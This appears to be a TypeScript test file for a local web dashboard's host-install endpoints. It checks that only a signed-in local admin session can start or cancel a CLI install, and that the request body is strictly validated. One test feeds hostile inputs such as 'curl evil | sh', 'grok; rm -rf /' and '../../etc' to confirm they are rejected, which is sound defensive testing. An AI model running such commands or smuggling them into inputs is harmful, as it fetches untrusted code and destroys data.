/**
 * AGEND-133 (upstream #3521): GET/POST /ui/host-install and POST /ui/host-install/cancel — the same gate as signing a CLI in from the dashboard.
 * A signed-in admin session on the local surface only. Never a read session, a guest, the CLI's header token, a session of the public link, or a request
 * that came through it. The body is strict: `{ backend }` and nothing else — what is run is the registry's, looked up by the server.
 */
import { ServerResponse, createServer, request, type IncomingMessage, type Server } from "node:http";
import { Readable } from "node:stream";
import { afterEach, describe, expect, it, vi } from "vitest";
import { WebSessionStore, csrfTokenFor, tokenEpoch, type SessionRecord } from "../src/web-session.js";
import { createSettingsReplay } from "../src/settings-request-capability.js";
import { SettingsExecution } from "../src/settings-transaction.js";
import { handleWebRequest, type WebApiContext } from "../src/web-api.js";
import { WebHostInstalls, type HostInstallReporter, type HostInstallStart } from "../src/web-host-install.js";
import { WEB_SESSION_COOKIE_SECURE } from "../src/web-auth.js";
import { bindGatewayRequest } from "../src/web-request-context.js";
import { evaluateWebRequest } from "../src/web-auth.js";
import { SettingsHttpConfirmation } from "../src/settings-http-confirmation.js";
import { SettingsConfirmationStore } from "../src/settings-confirmation.js";

const servers: Server[] = [], stores: SettingsConfirmationStore[] = [];
afterEach(async () => { for (const s of servers.splice(0)) await new Promise<void>(r => s.close(() => r())); for (const s of stores.splice(0)) s.close(); });

/**
 * A store whose answer to "who is this session?" can be bent by a test, to reach what the real store would never hand the route: a record on the wrong surface
 * (the real `authenticate` already refuses a public-link session on the local listener — the route's own `surface` check is the second lock), a session demoted
 * or swapped for another person's while a body is in flight.
 */
class BendableSessions extends WebSessionStore {
  bend: ((r: SessionRecord) => SessionRecord) | null = null;
  override authenticate(...args: Parameters<WebSessionStore["authenticate"]>): SessionRecord | null {
    const r = super.authenticate(...args);
    return r && this.bend ? this.bend(r) : r;
  }
}

async function setup(over: { start?: (backend: string, r: HostInstallReporter) => Promise<HostInstallStart> } = {}) {
  const token = "install-scratch-token", sessions = new BendableSessions({});
  const start = vi.fn(over.start ?? (async () => ({ started: true }) as HostInstallStart));
  const cancel = vi.fn(async () => true);
  const installs = new WebHostInstalls({ isLocalAdmin: handle => !!sessions.findByHandle(handle) && sessions.findByHandle(handle)!.tier === "admin" && sessions.findByHandle(handle)!.surface === "local",
    installable: b => ["grok", "codex"].includes(b), start, cancel });
  const ctx = { webToken: token, webSessions: sessions, webHostInstalls: installs } as unknown as WebApiContext;
  const store = new SettingsConfirmationStore({ audit: vi.fn() }); stores.push(store);
  const gate = new SettingsHttpConfirmation(store, {
    principal: req => {
      const auth = () => evaluateWebRequest(req, new URL(req.url!, "http://localhost"), token, sessions, { touch: false });
      const v = auth(); if (v.kind !== "allow" || v.via !== "session") return null;
      const s = v.session;
      return { id: s.idHash, label: s.label, source: "web_session", requester: { handle: s.handle, label: s.label },
        current: () => { const now = auth(); return now.kind === "allow" && now.via === "session" && now.session.idHash === s.idHash; },
        localAdmin: () => { const now = auth(); return now.kind === "allow" && now.via === "session" && now.session.tier === "admin" && now.session.surface === "local"; } };
    }, baseline: async () => ({ fingerprint: "baseline", config: null, classic: {} }), snapshot: () => null,
    directHostInstall: true, directCreationPolicy: () => true,
  });
  const next = (req: IncomingMessage, res: ServerResponse, url: URL) => handleWebRequest(req, res, url, ctx);
  const server = createServer((req, res) => { const url = new URL(req.url!, "http://localhost"); if (!gate.handle(req, res, url, next) && !next(req, res, url)) { res.writeHead(404); res.end(); } });
  servers.push(server); await new Promise<void>(r => server.listen(0, "127.0.0.1", r));
  const origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
  const as = (tier: "admin" | "read" | "guest", surface: "local" | "gateway" = "local") => {
    const m = sessions.create({ tier, surface, label: "Firefox on Linux", tokenEpoch: tokenEpoch(token), ...(surface === "gateway" ? { exposureId: "e".repeat(32) } : {}),
      ...(tier === "guest" ? { owner: { adapterId: "discord", userId: "111111111111111111" } } : {}) } as never);
    return { cookie: `agend_session=${m.sessionId}`, origin, "x-agend-csrf": csrfTokenFor(m.sessionId), "content-type": "application/json" } as Record<string, string>;
  };
  const call = (method: "GET" | "POST", path: string, headers: Record<string, string>, body?: unknown) => new Promise<{ status: number; body: any; headers: Record<string, any> }>((resolve, reject) => {
    const data = body === undefined ? null : Buffer.from(typeof body === "string" ? body : JSON.stringify(body));
    const r = request(`${origin}${path}`, { method, headers: { ...headers, ...(data ? { "content-length": String(data.length) } : {}) } }, res => {
      const c: Buffer[] = []; res.on("data", x => c.push(x)); res.on("end", () => { const raw = Buffer.concat(c).toString(); let parsed: any = null; try { parsed = raw ? JSON.parse(raw) : null; } catch { parsed = raw; } resolve({ status: res.statusCode!, body: parsed, headers: res.headers }); });
    }); r.on("error", reject); r.end(data ?? undefined);
  });
  const begin = vi.spyOn(installs, "begin");
  const settled = async (id: string) => {
    for (let i = 0; i < 50; i++) { const v = store.inspect(id)!; if (v.state !== "applying" && v.state !== "pending") return v; await new Promise<void>(r => setImmediate(r)); }
    throw Error("install confirmation did not settle");
  };
  return { token, sessions, start, cancel, installs, begin, ctx, as, call, origin, settled };
}

describe("who may ask", () => {
  it("the local admin session: yes — GET shows nothing, POST starts, GET then shows the run; answers are never cached", async () => {
    const t = await setup();
    const admin = t.as("admin");
    const none = await t.call("GET", "/ui/host-install", admin);
    expect([none.status, none.body]).toEqual([200, { install: null }]);
    expect(none.headers["cache-control"]).toContain("no-store");
    const started = await t.call("POST", "/ui/host-install", admin, { backend: "grok" });
    expect(started.status).toBe(202);
    const done = await t.settled(started.body.pending_change.id);
    expect(done.outcome!.result).toMatchObject({ install: { backend: "grok", phase: "running", startedOn: "Firefox on Linux" } });
    expect(t.start).toHaveBeenCalledTimes(1);
    expect((t.start.mock.calls[0] as unknown[])[0]).toBe("grok");
    expect((await t.call("GET", "/ui/host-install", admin)).body.install).toMatchObject({ backend: "grok", phase: "running" });
  });
  it("a read session, a guest, the web token and a request with no session: refused, and nothing starts", async () => {
    const t = await setup();
    for (const headers of [t.as("read"), t.as("guest")]) {
      expect((await t.call("GET", "/ui/host-install", headers)).status).toBe(403);
      expect((await t.call("POST", "/ui/host-install", headers, { backend: "grok" })).status).toBe(403);
      expect((await t.call("POST", "/ui/host-install/cancel", headers, {})).status).toBe(403);
    }
    const viaToken = { "x-agend-token": t.token, "content-type": "application/json" };
    expect((await t.call("POST", "/ui/host-install", viaToken, { backend: "grok" })).status).toBe(401);
    expect([401, 403]).toContain((await t.call("POST", "/ui/host-install", { "content-type": "application/json" }, { backend: "grok" })).status);
    expect(t.start).not.toHaveBeenCalled();
    expect(t.cancel).not.toHaveBeenCalled();
  });
  it("a session made over the public link (gateway surface) is refused", async () => {
    const t = await setup();
    const gw = t.as("admin", "gateway");
    expect((await t.call("GET", "/ui/host-install", gw)).status).toBeGreaterThanOrEqual(401);
    expect((await t.call("POST", "/ui/host-install", gw, { backend: "grok" })).status).toBeGreaterThanOrEqual(401);
    expect(t.start).not.toHaveBeenCalled();
  });
  it("a request that came through the public link: not found for a read; a write is refused (by the session gate before the route, or the route)", async () => {
    const t = await setup();
    const sessions = t.sessions;
    const gw = sessions.create({ tier: "admin", surface: "gateway", exposureId: "e".repeat(32), label: "gateway", tokenEpoch: tokenEpoch(t.token) } as never);
    class Res extends ServerResponse { status = 0; body = "";
      override writeHead(code: number): this { this.status = code; return this; }
      override end(chunk?: unknown): this { this.body += String(chunk ?? ""); return this; } }
    for (const [method, path] of [["GET", "/ui/host-install"], ["POST", "/ui/host-install"], ["POST", "/ui/host-install/cancel"]] as const) {
      const req = Readable.from([]) as unknown as IncomingMessage; req.method = method; req.url = path;
      req.headers = { host: "localhost", cookie: `${WEB_SESSION_COOKIE_SECURE}=${gw.sessionId}` };
      Object.defineProperty(req, "socket", { value: { remoteAddress: "127.0.0.1" }, configurable: true });
      bindGatewayRequest(req, { surface: "gateway", exposureId: "e".repeat(32), expectedOrigin: "https://public.example", isCurrent: () => true });
      const res = new Res(req);
      expect(handleWebRequest(req, res, new URL(path, "http://localhost"), t.ctx)).toBe(true);
      await vi.waitFor(() => expect(res.status).not.toBe(0));
      if (method === "GET") expect([res.status, JSON.parse(res.body).error]).toEqual([404, "install_not_over_public_link"]);
      else expect(res.status, `${method} ${path}`).toBeGreaterThanOrEqual(401);
    }
    expect(t.start).not.toHaveBeenCalled();
  });
  it("an admin session of the public link that reaches the local listener is refused (403) — the route's own surface check, behind the store's", async () => {
    const t = await setup();
    const admin = t.as("admin");
    // The real store refuses a gateway-surface session on a non-gateway request (401). Make it hand the record over anyway: the route must still say no.
    t.sessions.bend = r => ({ ...r, surface: "gateway", exposureId: "e".repeat(32) });
    for (const [method, path, body] of [["GET", "/ui/host-install", undefined], ["POST", "/ui/host-install", { backend: "grok" }], ["POST", "/ui/host-install/cancel", {}]] as const) {
      const r = await t.call(method, path, admin, body);
      expect([r.status, r.body.error], `${method} ${path}`).toEqual([403, "install_needs_a_local_admin"]);
    }
    expect(t.begin).not.toHaveBeenCalled();
    expect(t.start).not.toHaveBeenCalled();
    expect(t.cancel).not.toHaveBeenCalled();
  });
  /** A POST whose body arrives in two pieces; `between` runs while the server is waiting for the second. */
  async function slowPost(t: Awaited<ReturnType<typeof setup>>, headers: Record<string, string>, between: () => void) {
    return new Promise<{ status: number; body: any }>((resolve, reject) => {
      const r = request(`${t.origin}/ui/host-install`, { method: "POST", headers: { ...headers, "content-length": "20" } }, res => {
        const c: Buffer[] = []; res.on("data", x => c.push(x)); res.on("end", () => resolve({ status: res.statusCode!, body: JSON.parse(Buffer.concat(c).toString() || "null") }));
      });
      r.on("error", reject); r.write('{"backend":'); setTimeout(() => { between(); r.end('"grok"}  '); }, 50);
    });
  }
  it("a session revoked while the body is read: 401 from the route's own re-check, and begin is never called", async () => {
    const t = await setup();
    const m = t.sessions.create({ tier: "admin", surface: "local", label: "x", tokenEpoch: tokenEpoch(t.token) });
    const headers = { cookie: `agend_session=${m.sessionId}`, origin: t.origin, "x-agend-csrf": csrfTokenFor(m.sessionId), "content-type": "application/json" };
    const r = await slowPost(t, headers, () => { t.sessions.revokeById(m.sessionId); });
    expect(r.status).toBe(401);
    expect(t.begin).not.toHaveBeenCalled();
    expect(t.start).not.toHaveBeenCalled();
  });
  it("a session demoted while the body is read: 403, and begin is never called", async () => {
    const t = await setup();
    const admin = t.as("admin");
    const r = await slowPost(t, admin, () => { t.sessions.bend = rec => ({ ...rec, tier: "read" }); });
    expect([r.status, r.body.error]).toEqual([403, "install_needs_a_local_admin"]);
    expect(t.begin).not.toHaveBeenCalled();
    expect(t.start).not.toHaveBeenCalled();
  });
  it("a different person's session behind the same cookie once the body is in: 409, begin is never called", async () => {
    const t = await setup();
    const admin = t.as("admin");
    const r = await slowPost(t, admin, () => { t.sessions.bend = rec => ({ ...rec, handle: "f".repeat(16) }); });
    expect([r.status, r.body.error]).toEqual([409, "install_session_changed"]);
    expect(t.begin).not.toHaveBeenCalled();
  });
  it("a stale server-owned continuation never reaches begin", async () => {
    const t = await setup();
    const admin = t.as("admin");
    const execution = new SettingsExecution({ current: () => true, snapshot: () => ({}) });
    execution.cancel();
    // Even a server-owned replay with a valid cookie cannot revive a cancelled execution.
    const req = createSettingsReplay({ method: "POST", url: "/ui/host-install", body: Buffer.from('{"backend":"grok"}'), binding: "owned" }, execution);
    req.headers = { ...admin, host: new URL(t.origin).host };
    Object.defineProperty(req, "socket", { value: { remoteAddress: "127.0.0.1" }, configurable: true });
    const sent = await new Promise<{ status: number; body: string }>(resolve => {
      const out = { status: 0, body: "" };
      const res = new ServerResponse(req);
      res.writeHead = ((code: number) => { out.status = code; return res; }) as never;
      res.end = ((chunk?: unknown) => { out.body += String(chunk ?? ""); resolve(out); return res; }) as never;
      expect(handleWebRequest(req, res, new URL("/ui/host-install", "http://localhost"), t.ctx)).toBe(true);
    });
    expect(sent.status).toBe(409);
    expect(t.begin).not.toHaveBeenCalled();
    expect(t.start).not.toHaveBeenCalled();
  });
  it("a session that ends while the body is read starts nothing (checked again after it)", async () => {
    const t = await setup();
    const m = t.sessions.create({ tier: "admin", surface: "local", label: "x", tokenEpoch: tokenEpoch(t.token) });
    const headers = { cookie: `agend_session=${m.sessionId}`, origin: t.origin, "x-agend-csrf": csrfTokenFor(m.sessionId), "content-type": "application/json" };
    const pending = new Promise<{ status: number }>((resolve, reject) => {
      const r = request(`${t.origin}/ui/host-install`, { method: "POST", headers: { ...headers, "content-length": "20" } }, res => { res.resume(); res.on("end", () => resolve({ status: res.statusCode! })); });
      r.on("error", reject); r.write('{"backend":'); setTimeout(() => { t.sessions.revokeById(m.sessionId); r.end('"grok"}  '); }, 50);
    });
    expect((await pending).status).toBeGreaterThanOrEqual(401);
    expect(t.start).not.toHaveBeenCalled();
  });
});

describe("what is asked", () => {
  it("only { backend: <id> }: a command, an extra key, a bad id or no body is refused before anything runs", async () => {
    const t = await setup();
    const admin = t.as("admin");
    for (const body of [{ backend: "grok", command: "curl evil | sh" }, { command: "curl evil | sh" }, { backend: "grok; rm -rf /" }, { backend: "../../etc" }, { backend: 7 }, {}, [], "grok", "{not json"]) {
      const r = await t.call("POST", "/ui/host-install", admin, body as never);
      expect(r.status, JSON.stringify(body)).toBe(400);
    }
    expect(t.start).not.toHaveBeenCalled();
  });
  it("an unsupported CLI's refusal is preserved in the held outcome, nothing runs", async () => {
    const t = await setup();
    const r = await t.call("POST", "/ui/host-install", t.as("admin"), { backend: "opencode" });
    expect(r.status).toBe(202);
    expect((await t.settled(r.body.pending_change.id)).outcome!.detail).toContain("unsupported");
    expect(t.start).not.toHaveBeenCalled();
  });
  it.each([["busy", 409], ["already", 409], ["shutting_down", 503], ["failed", 500]] as const)("the fleet refuses with %s: its code and status come back", async (code, status) => {
    const t = await setup({ start: async () => ({ refused: code }) });
    const r = await t.call("POST", "/ui/host-install", t.as("admin"), { backend: "grok" });
    expect(r.status).toBe(202);
    expect((await t.settled(r.body.pending_change.id)).outcome!.detail).toContain(code);
  });
  it("cancel: any local admin; the body must be {}", async () => {
    const t = await setup();
    const admin = t.as("admin");
    expect((await t.call("POST", "/ui/host-install/cancel", admin, { backend: "grok" })).status).toBe(400);
    expect(t.cancel).not.toHaveBeenCalled();
    expect(await t.call("POST", "/ui/host-install/cancel", admin, {})).toMatchObject({ status: 200, body: { cancelled: true } });
    expect(t.cancel).toHaveBeenCalledTimes(1);
  });
  it("a query string on the read, or a method other than GET/POST, is not found", async () => {
    const t = await setup();
    const admin = t.as("admin");
    expect((await t.call("GET", "/ui/host-install?backend=grok", admin)).status).toBe(404);
    expect((await t.call("GET", "/ui/host-install/cancel", admin)).status).toBe(404);
  });
  it("a hand-built context with no installs: unavailable, not a crash", async () => {
    const t = await setup();
    (t.ctx as any).webHostInstalls = undefined;
    expect((await t.call("GET", "/ui/host-install", t.as("admin"))).body).toEqual({ error: "install_unavailable" });
  });
});
